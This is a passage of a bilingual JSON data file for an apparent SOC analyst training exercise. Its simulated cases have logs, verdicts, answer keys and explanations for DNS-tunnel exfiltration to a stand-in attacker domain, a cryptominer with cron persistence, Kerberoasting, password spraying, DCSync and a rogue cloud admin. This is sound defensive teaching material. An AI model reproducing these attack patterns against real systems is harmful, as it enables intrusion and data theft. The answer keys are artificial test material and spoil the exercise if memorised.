"fuente":"SIEM","regla":{"es":"Consultas DNS anómalas","en":"Anomalous DNS queries"},"titulo":{"es":"Subdominios larguísimos contra un mismo dominio","en":"Very long subdomains against one domain"},"resumen":{"es":"Miles de consultas TXT con etiquetas de casi 60 caracteres desde 10.20.3.33.","en":"Thousands of TXT queries with labels close to 60 characters from 10.20.3.33."},"logs":[["11:01:12","dns","query TXT 4e6f6d696e61735f323032362e786c73782d70617274303031.t.exfil-data.example from 10.20.3.33"],["11:01:12","dns","query TXT 0a1f9c33e2b7d4a8c6e0f1b2a3d4c5e6f7a8b9c0d1e2f3a4b5.t.exfil-data.example from 10.20.3.33"],["11:03:00","dns","summary src=10.20.3.33 domain=exfil-data.example queries=6420/10m unique_subdomains=6419 avg_label_len=58"],["11:03:05","note","el primer subdominio en hexadecimal se lee 'Nominas_2026.xlsx-part001'"]],"ruido":{"fuentes":["dns"],"n":14},"veredicto":"vp","accion":"contener","campos":[{"id":"dominio","label":{"es":"Dominio usado","en":"Domain used"},"ok":["exfil-data.example"]},{"id":"equipo","label":{"es":"IP del equipo que consulta","en":"IP of the querying host"},"ok":["10.20.3.33"]}],"mitre":"T1048.003","claves":["exfil-data.example","10.20.3.33"],"competencias":["triaje","red","logs","respuesta"],"explica":{"es":"Casi cada consulta es un subdominio único y codificado: los datos salen troceados dentro de las preguntas DNS, y el primero decodifica como un fichero de nóminas. 10.20.3.33 es PC-FIN-003, el equipo comprometido por la macro del martes. Contener: aislar el equipo y bloquear el dominio en el DNS.","en":"Almost every query is a unique encoded subdomain: data leaves in chunks inside DNS questions, and the first one decodes as a payroll file. 10.20.3.33 is PC-FIN-003, the PC compromised by Tuesday's macro. Contain: isolate the host and sinkhole the domain in DNS."},"mitreAlt":["T1071.004"]},{"id":"T4-06","hora":"11:50","sev":"media","fuente":"Proxy","regla":{"es":"Subida grande a almacenamiento personal","en":"Large upload to personal storage"},"titulo":{"es":"3,4 GB subidos a una nube personal","en":"3.4 GB uploaded to a personal cloud"},"resumen":{"es":"Subida de un ZIP a un servicio de almacenamiento no corporativo.","en":"A ZIP uploaded to a non-corporate storage service."},"logs":[["11:41:00","proxy01","user=j.romero POST https://files.example/upload?name=clientes_completo_2026.zip 200 bytes_out=3.4GB category=personal_storage"],["11:41:02","dlp","match file=clientes_completo_2026.zip patterns=dni,iban,email count=18402"],["11:42:10","ad","j.romero baja voluntaria comunicada 2026-10-30 · ultimo dia 2026-11-14"],["11:42:12","itsm","busqueda peticiones de j.romero para files.example: ninguna"]],"ruido":{"fuentes":["proxy"],"n":12},"veredicto":"vp","accion":"escalar","campos":[{"id":"usuario","label":{"es":"Usuario","en":"User"},"ok":["j.romero"]},{"id":"fichero","label":{"es":"Fichero subido","en":"Uploaded file"},"ok":["clientes_completo_2026.zip"]}],"mitre":"T1567.002","claves":["j.romero","clientes_completo_2026.zip"],"competencias":["triaje","red","comunicacion"],"explica":{"es":"Una persona que deja la empresa en dos semanas sube a su nube personal 18 402 registros de clientes con DNI e IBAN, sin ninguna petición. Es una posible fuga de datos personales con implicaciones legales y de RR. HH.: se escala a N2 con todas las evidencias. Un N1 no contiene ni contacta con la persona por su cuenta.","en":"Someone leaving the company in two weeks uploads 18,402 customer records with ID numbers and IBANs to their personal cloud, with no request on file. It is a possible personal data leak with legal and HR implications: escalate to tier 2 with all the evidence. Tier 1 neither contains nor contacts the person on their own."}},{"id":"T4-07","hora":"12:40","sev":"media","fuente":"SIEM","regla":{"es":"Conexión a IP de la lista de TOR","en":"Connection to an IP on the TOR list"},"titulo":{"es":"Tráfico hacia una IP marcada como nodo TOR","en":"Traffic to an IP flagged as a TOR node"},"resumen":{"es":"Todos los servidores conectan con 198.51.100.9, que la fuente de amenazas marca como TOR desde hoy.","en":"Every server connects to 198.51.100.9, which the threat feed flags as TOR since today."},"logs":[["12:30:00","ti","feed TOR-relays actualizado: +312 IP · incluye 198.51.100.9"],["12:35:10","fw01","ALLOW udp 10.20.0.10:123 -> 198.51.100.9:123"],["12:35:10","fw01","ALLOW udp 10.20.0.20:123 -> 198.51.100.9:123"],["12:35:11","dns","198.51.100.9 PTR ntp1.proveedor-hora.example · configurado como servidor NTP en GPO 'Hora-Dominio' desde 2024"],["12:36:00","ti","aviso del proveedor de la fuente: 'la actualizacion de las 12:30 incluyo por error un bloque de servidores NTP; se corregira a las 14:00'"]],"ruido":{"fuentes":["fw","dns"],"n":12},"veredicto":"fp","accion":"cerrar","campos":[{"id":"puerto","label":{"es":"Puerto de destino","en":"Destination port"},"ok":["123","udp/123","123/udp"]},{"id":"servicio","label":{"es":"Servicio real de esa IP","en":"Real service at that IP"},"ok":["ntp"]}],"mitre":null,"claves":["ntp","198.51.100.9"],"competencias":["triaje","red","logs"],"explica":{"es":"El tráfico es UDP/123 hacia el servidor de hora que el dominio usa desde 2024; lo que cambió hoy fue la fuente de inteligencia, que metió esa IP por error y el proveedor ya lo ha reconocido. Falso positivo: se cierra y se propone excluir la IP hasta que llegue la corrección. Bloquearla habría desincronizado la hora del dominio y roto Kerberos.","en":"The traffic is UDP/123 to the time server the domain has used since 2024; what changed today was the intelligence feed, which added that IP by mistake, and the provider has already admitted it. False positive: close it and propose excluding the IP until the fix lands. Blocking it would have broken domain time sync and Kerberos."}},{"id":"T4-08","hora":"13:30","sev":"alta","fuente":"EDR","regla":{"es":"Conexión a pool de minería","en":"Connection to a mining pool"},"titulo":{"es":"El servidor web al 100 % de CPU","en":"The web server at 100 % CPU"},"resumen":{"es":"Un proceso con nombre de hilo del núcleo consume toda la CPU de SRV-WEB01.","en":"A process named like a kernel thread eats all of SRV-WEB01's CPU."},"logs":[["13:20:00","edr","process=kworkerds parent=sh user=www-data host=SRV-WEB01 path=/tmp/.x/kworkerds cpu=98%"],["13:20:02","fw01","ALLOW tcp 10.20.1.15:39020 -> 203.0.113.77:3333"],["13:20:05","edr","network host=SRV-WEB01 process=kworkerds payload='{\"method\":\"mining.subscribe\"}'"],["13:21:00","edr","crontab www-data: '*/5 * * * * /tmp/.x/kworkerds' creado 08:54"]],"ruido":{"fuentes":["edr","fw"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"puerto","label":{"es":"Puerto del pool","en":"Pool port"},"ok":["3333"]},{"id":"proceso","label":{"es":"Proceso malicioso","en":"Malicious process"},"ok":["kworkerds"]}],"mitre":"T1496","claves":["kworkerds","3333","SRV-WEB01"],"competencias":["triaje","endpoint","red","respuesta"],"explica":{"es":"Los hilos del núcleo no viven en /tmp ni los lanza www-data; «mining.subscribe» al puerto 3333 es el protocolo Stratum de minería. El cron se creó a las 08:54, justo después del web shell de T4-02: es la misma intrusión. Contener: SRV-WEB01 sigue comprometido y el N2 debe saber que hay persistencia.","en":"Kernel threads do not live in /tmp nor run as www-data; «mining.subscribe» on port 3333 is the Stratum mining protocol. The cron job was created at 08:54, right after the T4-02 web shell: same intrusion. Contain: SRV-WEB01 is still compromised and tier 2 needs to know there is persistence."}}]},"t5":{"id":"T5","dia":{"es":"Viernes","en":"Friday"},"tema":{"es":"Identidades y directorio activo","en":"Identities and Active Directory"},"casos":[{"id":"T5-01","hora":"08:05","sev":"alta","fuente":"SIEM","regla":{"es":"Muchos tickets de servicio con cifrado débil","en":"Many service tickets with weak encryption"},"titulo":{"es":"Una cuenta pide tickets para todos los servicios en un minuto","en":"One account requests tickets for every service in a minute"},"resumen":{"es":"Eventos 4769 con TicketEncryptionType 0x17 para 23 SPN distintos.","en":"4769 events with TicketEncryptionType 0x17 for 23 different SPNs."},"logs":[["08:02:10","dc","EventID=4769 ServiceName=MSSQLSvc/SRV-SQL01:1433 TargetUserName=l.moreno IpAddress=10.20.2.21 TicketEncryptionType=0x17"],["08:02:10","dc","EventID=4769 ServiceName=svc_backup TargetUserName=l.moreno IpAddress=10.20.2.21 TicketEncryptionType=0x17"],["08:02:11","dc","EventID=4769 ServiceName=HTTP/intranet TargetUserName=l.moreno IpAddress=10.20.2.21 TicketEncryptionType=0x17"],["08:02:58","dc","summary TargetUserName=l.moreno distinct_spn=23 window=48s enc=0x17(RC4)"],["08:03:00","baseline","l.moreno solicita normalmente 2-3 tickets al dia, siempre con 0x12 (AES256)"]],"ruido":{"fuentes":["dc","win"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"cifrado","label":{"es":"Tipo de cifrado pedido","en":"Encryption type requested"},"ok":["0x17","rc4","rc4-hmac"]},{"id":"equipo","label":{"es":"IP de origen","en":"Source IP"},"ok":["10.20.2.21"]}],"mitre":"T1558.003","claves":["l.moreno","0x17","10.20.2.21"],"competencias":["triaje","identidad","logs","respuesta"],"explica":{"es":"Pedir tickets de 23 servicios en 48 segundos y forzar RC4 (0x17) es Kerberoasting: el atacante se lleva los tickets para romper offline las contraseñas de las cuentas de servicio. Viene de PC-ALM-021, el equipo con la baliza del jueves. Contener: aislar el equipo, deshabilitar l.moreno y escalar para rotar las contraseñas de svc_backup y del resto de servicios.","en":"Requesting tickets for 23 services in 48 seconds and forcing RC4 (0x17) is Kerberoasting: the attacker takes the tickets to crack service account passwords offline. It comes from PC-ALM-021, Thursday's beaconing PC. Contain: isolate the host, disable l.moreno and escalate so svc_backup and the other service passwords get rotated."}},{"id":"T5-02","hora":"08:50","sev":"alta","fuente":"SIEM","regla":{"es":"Un origen falla contra muchas cuentas","en":"One source fails against many accounts"},"titulo":{"es":"Un intento por cuenta contra 60 usuarios","en":"One attempt per account against 60 users"},"resumen":{"es":"4625 desde un mismo origen contra 60 cuentas distintas, una vez cada una.","en":"4625 from one source against 60 different accounts, once each."},"logs":[["08:44:01","dc","EventID=4625 TargetUserName=a.garcia IpAddress=10.20.3.41 Status=0xC000006A"],["08:44:02","dc","EventID=4625 TargetUserName=m.ortega IpAddress=10.20.3.41 Status=0xC000006A"],["08:44:03","dc","EventID=4625 TargetUserName=h.diaz IpAddress=10.20.3.41 Status=0xC000006A"],["08:46:40","dc","summary IpAddress=10.20.3.41 distinct_users=60 failures=59 password='Noviembre2026!'"],["08:46:41","dc","EventID=4624 TargetUserName=j.romero IpAddress=10.20.3.41 LogonType=3"]],"ruido":{"fuentes":["dc"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"usuario","label":{"es":"Cuenta que cae","en":"Account that falls"},"ok":["j.romero"]},{"id":"origen","label":{"es":"IP de origen","en":"Source IP"},"ok":["10.20.3.41"]}],"mitre":"T1110.003","claves":["j.romero","10.20.3.41"],"competencias":["triaje","identidad","logs","respuesta"],"explica":{"es":"Una contraseña probada contra muchas cuentas, una vez cada una para no bloquearlas: rociado de contraseñas. Acierta con j.romero («Noviembre2026!»). El origen es PC-FIN-007 otra vez. Contener: cambiar la contraseña de j.romero, revisar su sesión y escalar; además, proponer que se prohíban contraseñas con el mes y el año.","en":"One password tried against many accounts, once each to avoid lockouts: password spraying. It hits j.romero («Noviembre2026!»). The source is PC-FIN-007 again. Contain: reset j.romero's password, review her session and escalate; also propose banning passwords built from month and year."}},{"id":"T5-03","hora":"09:30","sev":"critica","fuente":"SIEM","regla":{"es":"Replicación de directorio desde un equipo que no es DC","en":"Directory replication from a non-DC host"},"titulo":{"es":"Un puesto de trabajo pide replicar el directorio","en":"A workstation asks to replicate the directory"},"resumen":{"es":"Evento 4662 con los permisos de replicación desde una IP de usuario.","en":"Event 4662 with replication rights from a user IP."},"logs":[["09:27:12","dc","EventID=4662 SubjectUserName=soporte$ ObjectType=domainDNS Properties='{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}' IpAddress=10.20.3.41"],["09:27:13","dc","EventID=4624 TargetUserName=soporte$ IpAddress=10.20.3.41 LogonType=3"],["09:27:40","ad","soporte$ miembro de: Domain Admins (añadido 2026-11-05 03:12, sin cambio asociado)"],["09:28:00","ad","controladores de dominio legitimos: SRV-DC01 (10.20.0.10)"]],"ruido":{"fuentes":["dc"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"cuenta","label":{"es":"Cuenta que replica","en":"Account replicating"},"ok":["soporte$"]},{"id":"origen","label":{"es":"IP de origen","en":"Source IP"},"ok":["10.20.3.41"]}],"mitre":"T1003.006","claves":["soporte$","10.20.3.41","DCSync"],"competencias":["triaje","identidad","respuesta"],"explica":{"es":"Los GUID 1131f6aa y 1131f6ad son los permisos «replicar cambios del directorio»: solo los controladores de dominio deberían usarlos. Que lo haga soporte$ desde PC-FIN-007 es DCSync: el atacante obtiene el hash de cualquier cuenta, incluida krbtgt. El dominio entero está comprometido: contener y activar el plan de crisis.","en":"GUIDs 1131f6aa and 1131f6ad are the «replicate directory changes» rights: only domain controllers should use them. soporte$ doing it from PC-FIN-007 is DCSync: the attacker gets the hash of any account, krbtgt included. The whole domain is compromised: contain and trigger the crisis plan."}},{"id":"T5-04","hora":"10:10","sev":"alta","fuente":"SIEM","regla":{"es":"Envenenamiento LLMNR/NBT-NS","en":"LLMNR/NBT-NS poisoning"},"titulo":{"es":"Respuestas LLMNR falsas desde un equipo desconocido","en":"Spoofed LLMNR answers from an unknown host"},"resumen":{"es":"10.20.9.50 responde a consultas LLMNR de toda la red.","en":"10.20.9.50 answers LLMNR queries from the whole network."},"logs":[["08:00:00","itsm","CHG-2101 aprobado: prueba de intrusión interna · empresa Auditoria Ejemplo · equipo 10.20.9.50 · 10-14 nov · 08:00-18:00"],["10:05:20","ids","alert 'LLMNR response from non-DNS host' src=10.20.9.50 dst=10.20.2.0/24"],["10:06:02","edr","unmanaged device 10.20.9.50 hostname=kali-auditoria mac=00:00:5e:00:53:01"],["10:07:15","itsm","CHG-2101 nota del auditor: 'iniciada fase de captura de hashes (Responder)'"]],"ruido":{"fuentes":["dns","win"],"n":12},"veredicto":"benigno","accion":"cerrar","campos":[{"id":"cambio","label":{"es":"Cambio que lo autoriza","en":"Change that authorises it"},"ok":["CHG-2101"]}],"mitre":null,"claves":["CHG-2101","10.20.9.50"],"competencias":["triaje","red","comunicacion"],"explica":{"es":"Es una técnica de ataque real, pero la hace el equipo del pentest autorizado en CHG-2101, con IP, fechas y fase anotadas. Benigno: se cierra citando el cambio. Y es una buena noticia: la detección funciona. Si el equipo de pruebas fuese otro o estuviera fuera de horario, habría que escalar.","en":"It is a real attack technique, but it is the authorised pentest team under CHG-2101, with IP, dates and phase on record. Benign: close it citing the change. And it is good news: detection works. If the testing host were a different one or outside hours, you would escalate."}},{"id":"T5-05","hora":"10:50","sev":"critica","fuente":"Entra ID","regla":{"es":"Nuevo administrador global","en":"New global administrator"},"titulo":{"es":"Alguien añade una cuenta como administrador global de la nube","en":"Someone adds an account as cloud global admin"},"resumen":{"es":"Cambio de rol privilegiado en el inquilino de la empresa.","en":"Privileged role change in the company tenant."},"logs":[["10:44:10","entra","AuditLog action='Add user' target=backup.admin@nortelogistica.example initiatedBy=l.moreno ip=198.51.100.140"],["10:44:52","entra","AuditLog action='Add member to role' role='Global Administrator' target=backup.admin@nortelogistica.example initiatedBy=l.moreno ip=198.51.100.140"],["10:45:30","entra","SignIn result=success user=backup.admin@nortelogistica.example ip=198.51.100.140 mfa=none"],["10:46:00","ad","l.moreno rol: Almacen · no tiene funciones de administracion"]],"ruido":{"fuentes":["entra"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"cuenta","label":{"es":"Cuenta creada","en":"Account created"},"ok":["backup.admin@nortelogistica.example","backup.admin"]},{"id":"ip","label":{"es":"IP de origen","en":"Source IP"},"ok":["198.51.100.140"]}],"mitre":"T1098.003","claves":["backup.admin","198.51.100.140","Global Administrator"],"competencias":["triaje","identidad","respuesta"],"explica":{"es":"La IP es la del ataque de fatiga de MFA del martes (T2-04) y la cuenta que actúa es l.moreno, de Almacén. Crear un administrador global con un nombre creíble y sin MFA es la forma de quedarse con la nube aunque se recupere todo lo demás. Contener: quitar el rol, deshabilitar backup.admin y escalar como incidente crítico.","en":"The IP is Tuesday's MFA fatigue attacker (T2-04) and the acting account is l.moreno, from the Warehouse. Creating a believable global admin without MFA is how they keep the cloud even after everything else is recovered. Contain: remove the role, disable backup.admin and escalate as a critical incident."}},{"id":"T5-06","hora":"11:35","sev":"media","fuente":"Entra ID","regla":{"es":"MFA desactivada para un usuario","en":"MFA disabled for a user"},"titulo":{"es":"Soporte quita los métodos de MFA a un usuario","en":"Helpdesk removes a user's MFA methods"},"resumen":{"es":"h.diaz elimina los métodos de autenticación de a.garcia.","en":"h.diaz deletes a.garcia's authentication methods."},"logs":[["11:20:00","itsm","INC-5602 abierto por a.garcia en persona en el mostrador de IT: 'perdí el móvil, no puedo entrar' · identidad verificada con DNI por h.diaz"],["11:31:40","entra","AuditLog action='Delete authentication method' target=a.garcia initiatedBy=h.diaz ip=192.0.2.1"],["11:33:05","entra","AuditLog action='Register security info' user=a.garcia method=authenticator_app ip=192.0.2.1 device=PC-SOP-002"],["11:33:30","itsm","INC-5602 cerrado: 'nuevo móvil registrado con el usuario presente'"]],"ruido":{"fuentes":["entra"],"n":12},"veredicto":"benigno","accion":"cerrar","campos":[{"id":"ticket","label":{"es":"Ticket que lo justifica","en":"Ticket that explains it"},"ok":["INC-5602"]}],"mitre":null,"claves":["INC-5602","h.diaz"],"competencias":["triaje","identidad","comunicacion"],"explica":{"es":"Comparado con T2-04, la diferencia está en el proceso: la persona fue en persona, se verificó su identidad, todo ocurre desde la oficina y el nuevo método se registra al momento delante de soporte. Benigno, con INC-5602. Esta alerta merece revisarse siempre: el restablecimiento de MFA es una vía de ataque clásica.","en":"Compared with T2-04, the difference is the process: the user came in person, identity was verified, everything happens from the office and the new method is registered on the spot in front of helpdesk. Benign, with INC-5602. This alert always deserves a look: MFA resets are a classic attack path."}},{"id":"T5-07","hora":"12:20","sev":"alta","fuente":"SIEM","regla":{"es":"TGT sin preautenticación","en":"TGT without pre-authentication"},"titulo":{"es":"Se pide un TGT de una cuenta sin preautenticación","en":"A TGT is requested for an account without pre-auth"},"resumen":{"es":"Evento 4768 con PreAuthType 0 para una cuenta de servicio antigua.","en":"Event 4768 with PreAuthType 0 for a legacy service account."},"logs":[["12:16:30","dc","EventID=4768 TargetUserName=svc_legacy IpAddress=10.20.3.41 PreAuthType=0 TicketEncryptionType=0x17"],["12:16:31","dc","EventID=4768 TargetUserName=svc_legacy IpAddress=10.20.3.41 PreAuthType=0 TicketEncryptionType=0x17"],["12:17:00","ad","svc_legacy userAccountControl=DONT_REQ_PREAUTH · creada 2015 para la aplicación de nóminas antigua (retirada en 2022)"],["12:17:05","baseline","svc_legacy sin actividad en los últimos 400 días"]],"ruido":{"fuentes":["dc"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"cuenta","label":{"es":"Cuenta atacada","en":"Targeted account"},"ok":["svc_legacy"]},{"id":"preauth","label":{"es":"Valor de PreAuthType","en":"PreAuthType value"},"ok":["0"]}],"mitre":"T1558.004","claves":["svc_legacy","PreAuthType=0","10.20.3.41"],"competencias":["triaje","identidad","logs","respuesta"],"explica":{"es":"Sin preautenticación, cualquiera puede pedir un TGT de esa cuenta y romper su contraseña offline: AS-REP Roasting. svc_legacy lleva 400 días muerta y el origen vuelve a ser PC-FIN-007. Contener: deshabilitar svc_legacy (no la usa nada) y escalar; y proponer revisar qué otras cuentas tienen DONT_REQ_PREAUTH.","en":"Without pre-authentication anyone can request a TGT for that account and crack its password offline: AS-REP Roasting. svc_legacy has been dead for 400 days and the source is PC-FIN-007 again. Contain: disable svc_legacy (nothing uses it) and escalate; and propose reviewing which other accounts have DONT_REQ_PREAUTH."}},{"id":"T5-08","hora":"13:10","sev":"media","fuente":"SIEM","regla":{"es":"Inicio de sesión interactivo de cuenta de servicio","en":"Interactive logon by a service account"},"titulo":{"es":"svc_backup inicia sesión en el servidor de copias","en":"svc_backup logs on to the backup server"},"resumen":{"es":"La regla marca un inicio de sesión de svc_backup como interactivo en SRV-BKP01.","en":"The rule marks an svc_backup logon on SRV-BKP01 as interactive."},"logs":[["13:05:00","win-SRV-BKP01","EventID=7036 ServiceName='Veeam Backup Service' state=running"],["13:05:01","win-SRV-BKP01","EventID=4624 LogonType=5 TargetUserName=svc_backup ProcessName=C:\\Windows\\System32\\services.exe"],["13:05:02","siem","regla 'Inicio interactivo de cuenta de servicio' condicion: LogonType IN (2,5,10)  <-- incluye 5 por error"],["13:05:40","baseline","este evento ocurre cada dia a las 13:05 desde hace 2 años (reinicio programado del servicio)"]],"ruido":{"fuentes":["win"],"n":12},"veredicto":"fp","accion":"cerrar","campos":[{"id":"logontype","label":{"es":"LogonType real del evento","en":"Actual LogonType of the event"},"ok":["5"]}],"mitre":null,"claves":["LogonType","5","svc_backup"],"competencias":["triaje","logs","comunicacion"],"explica":{"es":"LogonType 5 es «servicio»: el propio services.exe arranca el servicio de copias con su cuenta, como todos los días. La regla incluye el 5 por error, así que se dispara sin que haya ningún inicio interactivo. Falso positivo: se cierra y se pide corregir la condición de la regla (2 y 10). Leer el campo, no el título de la alerta.","en":"LogonType 5 means «service»: services.exe itself starts the backup service with its account, as every day. The rule includes 5 by mistake, so it fires without any interactive logon. False positive: close it and ask for the rule condition to be fixed (2 and 10). Read the field, not the alert title."}}]},"guias":{"decision":{"preguntas":{"malicioso":{"es":"¿Lo que ves en los registros es actividad maliciosa o no autorizada?","en":"Is what you see in the logs malicious or unauthorised activity?","ayuda":{"es":"Busca la autorización antes de juzgar: un cambio aprobado (CHG), una incidencia (INC), una petición (REQ) o un pentest contratado convierten una técnica de ataque en trabajo legítimo.","en":"Look for authorisation before you judge: an approved change (CHG), an incident (INC), a request (REQ) or a contracted pentest turn an attack technique into legitimate work."}},"real":{"es":"¿La regla vio algo que ocurrió de verdad?","en":"Did the rule see something that really happened?","ayuda":{"es":"Si la actividad existió y estaba autorizada, es benigno. Si la regla se equivocó (geolocalización de una VPN, una firma heurística sobre software legítimo, una condición mal escrita), es falso positivo.","en":"If the activity happened and was authorised, it is benign. If the rule got it wrong (VPN geolocation, a heuristic hit on legitimate software, a badly written condition), it is a false positive."}},"efecto":{"es":"¿Llegó a tener efecto? Un «login OK», un proceso que se ejecuta, una conexión saliente, un cambio de permisos o datos que salen.","en":"Did it take effect? A «login OK», a process that runs, an outbound connection, a permission change or data leaving.","ayuda":{"es":"Un 403 del WAF, un puerto cerrado o un correo en cuarentena significan que el control funcionó. Un solo 200, un solo «login OK» o un solo proceso hijo lo cambian todo.","en":"A WAF 403, a closed port or a quarantined email mean the control worked. A single 200, a single «login OK» or a single child process changes everything."}},"compromiso":{"es":"¿Es un compromiso claro (cuenta robada, malware, C2, cifrado de ficheros) que el playbook puede cortar ya?","en":"Is it a clear compromise (stolen account, malware, C2, files being encrypted) that the playbook can cut off now?","ayuda":{"es":"Si la amenaza es técnica y está activa, cada minuto cuenta. Si la duda es sobre una persona de la empresa, un fraude o datos personales, el N1 no actúa a ciegas: escala.","en":"If the threat is technical and active, every minute counts. If the doubt is about a person in the company, fraud or personal data, T1 does not act blindly: it escalates."}}},"resultados":{"benigno":{"veredicto":"benigno","accion":"cerrar","es":"Real pero autorizado. Cierra citando la autorización (CHG, INC, REQ) y, si la alerta es útil, déjala como está: debe seguir saltando la próxima vez.","en":"Real but authorised. Close quoting the authorisation (CHG, INC, REQ) and, if the alert is useful, leave it as it is: it should fire again next time.","ejemplo":{"es":"El equipo de sistemas lanza un script de inventario por WinRM a todos los equipos dentro de la ventana de un cambio aprobado.","en":"The systems team runs an inventory script over WinRM on every host within the window of an approved change."}},"fp":{"veredicto":"fp","accion":"cerrar","es":"La regla se equivocó. Cierra explicando por qué y propone el ajuste (excluir un rango, un hash o corregir la condición): así el siguiente analista no pierde el tiempo.","en":"The rule got it wrong. Close explaining why and propose the tuning (exclude a range or a hash, fix the condition) so the next analyst does not waste time.","ejemplo":{"es":"Una regla de exfiltración cuenta como subida la descarga de una actualización porque lee los bytes en el sentido contrario.","en":"An exfiltration rule counts an update download as an upload because it reads the bytes in the wrong direction."}},"bloqueado":{"veredicto":"vp","accion":"cerrar","es":"Ataque real, pero frenado y sin impacto. Es verdadero positivo: documenta lo que viste, comprueba que el control respondió en todas las peticiones y cierra. Escalar cada intento saturaría al nivel 2.","en":"A real attack, but stopped and with no impact. It is a true positive: document what you saw, check that the control answered every request and close. Escalating every attempt would flood tier 2.","ejemplo":{"es":"Llega un correo con un adjunto malicioso, la pasarela lo pone en cuarentena y no lo recibe nadie.","en":"An email with a malicious attachment arrives, the gateway quarantines it and nobody receives it."}},"contener":{"veredicto":"vp","accion":"contener","es":"Compromiso activo: aplica el playbook ya (deshabilitar la cuenta, cortar la sesión, aislar el equipo, bloquear la IP o el dominio) y escala a N2 para el alcance. Contener no es resolver: es parar la hemorragia.","en":"Active compromise: run the playbook now (disable the account, kill the session, isolate the host, block the IP or domain) and escalate to T2 for scoping. Containing is not solving: it stops the bleeding.","ejemplo":{"es":"Una cuenta de soporte inicia sesión de madrugada desde una IP extranjera y empieza a leer los buzones de dirección.","en":"A support account signs in at dawn from a foreign IP and starts reading the executives’ mailboxes."}},"escalar":{"veredicto":"vp","accion":"escalar","es":"Necesita a alguien con más contexto o autoridad: una persona de la casa, un fraude, datos personales o una cuenta que no sabes si está comprometida. Escala con todas las evidencias y no contactes ni bloquees a la persona por tu cuenta.","en":"It needs someone with more context or authority: a person in the company, fraud, personal data or an account you cannot tell is compromised. Escalate with all the evidence and do not contact or block the person yourself.","ejemplo":{"es":"Alguien de Compras cambia el IBAN de un proveedor justo después de recibir un correo «urgente» que dice venir de ese proveedor.","en":"Someone in Purchasing changes a supplier’s IBAN right after an «urgent» email that claims to come from that supplier."}}}},"familias":[{"id":"acceso","icono":"user","titulo":{"es":"Identidad y accesos","en":"Identity and access"},"que":{"es":"Inicios de sesión, VPN, RDP, MFA y cuentas de servicio. La pregunta de fondo es siempre la misma: ¿quien entra es quien dice ser y tiene por qué entrar ahí?","en":"Sign-ins, VPN, RDP, MFA and service accounts. The underlying question is always the same: is whoever signs in who they claim to be, and should they be there?"},"triaje":[{"es":"Cuenta los fallos y busca si después hay un «login OK» desde el mismo origen.","en":"Count the failures and check whether a «login OK» follows from the same source."},{"es":"Mira el origen: IP de Internet, de la VPN corporativa o de una estación de administración.","en":"Check the source: Internet IP, corporate VPN or an admin workstation."},{"es":"Comprueba el tipo de inicio de sesión (LogonType 2, 3, 5, 10) y si hubo MFA.","en":"Check the logon type (LogonType 2, 3, 5, 10) and whether MFA was used."},{"es":"Busca una incidencia o un cambio que explique el acceso (INC, CHG).","en":"Look for an incident or change that explains the access (INC, CHG)."}],"fp":[{"es":"Salidas de la VPN de la empresa en otro país que la regla geolocaliza como un viaje.","en":"Company VPN exits in another country that the rule geolocates as travel."},{"es":"LogonType 5 (servicio) incluido por error en una regla de inicios interactivos.","en":"LogonType 5 (service) wrongly included in an interactive sign-in rule."},{"es":"Soporte que entra en un servidor con una incidencia asignada y en su horario.","en":"Support staff signing in to a server with an assigned ticket during working hours."},{"es":"Desactivar la MFA con verificación de identidad en persona y registro del nuevo método en el acto.","en":"Disabling MFA with in-person identity checks and the new method registered on the spot."}],"analisis":[{"es":"¿Qué hizo la sesión después de entrar? Sigue la IP asignada por la VPN o el equipo de origen.","en":"What did the session do after signing in? Follow the VPN-assigned IP or the source host."},{"es":"¿Un mismo origen falla contra muchas cuentas (rociado) o muchas veces contra una (fuerza bruta)?","en":"Does one source fail against many accounts (spraying) or many times against one (brute force)?"},{"es":"¿Se aprobó una petición de MFA que la persona no esperaba?","en":"Was an MFA prompt approved that the person did not expect?"}],"respuesta":[{"si":{"es":"Hay un acceso con éxito que la persona no reconoce o la sesión ya toca otros equipos","en":"There is a successful sign-in the person does not recognise, or the session is already reaching other hosts"},"accion":"contener","porque":{"es":"La cuenta está en manos de otro: deshabilítala, corta la sesión y bloquea el origen antes de que se mueva.","en":"Someone else has the account: disable it, kill the session and block the source before it moves on."}},{"si":{"es":"Solo hay fallos, la cuenta no llegó a entrar y el origen es ruido de Internet","en":"There are only failures, the account never got in and the source is Internet noise"},"accion":"cerrar","porque":{"es":"Ataque real pero sin éxito: documéntalo como verdadero positivo y vigila si se repite.","en":"A real but unsuccessful attack: document it as a true positive and watch for repeats."}},{"si":{"es":"El acceso coincide con un cambio o una incidencia (persona, equipo y hora)","en":"The access matches a change or ticket (person, host and time)"},"accion":"cerrar","porque":{"es":"Es benigno: cierra citando la referencia.","en":"It is benign: close quoting the reference."}},{"si":{"es":"Un servicio expuesto a Internet (RDP, VPN) recibe intentos y sigue abierto","en":"An Internet-facing service (RDP, VPN) is being attacked and is still open"},"accion":"contener","porque":{"es":"La exposición es el problema: ciérrala o restríngela y escala para revisar si alguien llegó a entrar.","en":"The exposure is the problem: close or restrict it and escalate to check whether anyone got in."}}],"casos":["T1-01","T1-05","T1-06","T1-08","T2-04","T3-08","T5-02","T5-06","T5-08"]},{"id":"correo","icono":"mail","titulo":{"es":"Correo y suplantación","en":"Email and impersonation"},"que":{"es":"Phishing, adjuntos, reglas de buzón, consentimientos de aplicaciones y fraude del CEO. El correo es la puerta de entrada más común y la más engañosa.","en":"Phishing, attachments, mailbox rules, app consents and CEO fraud. Email is the most common way in and the most deceptive."},"triaje":[{"es":"Compara el dominio letra a letra con el real y mira su antigüedad.","en":"Compare the domain letter by letter with the real one and check its age."},{"es":"Lee SPF, DKIM y DMARC, pero no te quedes ahí: un atacante pasa la autenticación de su propio dominio.","en":"Read SPF, DKIM and DMARC, but do not stop there: an attacker passes authentication for their own domain."},{"es":"¿Quién más recibió el mismo correo y quién hizo clic o abrió el adjunto?","en":"Who else received the same email, and who clicked or opened the attachment?"},{"es":"Busca reglas de reenvío o consentimientos nuevos en el buzón afectado.","en":"Look for new forwarding rules or consents on the affected mailbox."}],"fp":[{"es":"Un proveedor cambia de servidor y su SPF falla, pero DKIM y DMARC pasan y el 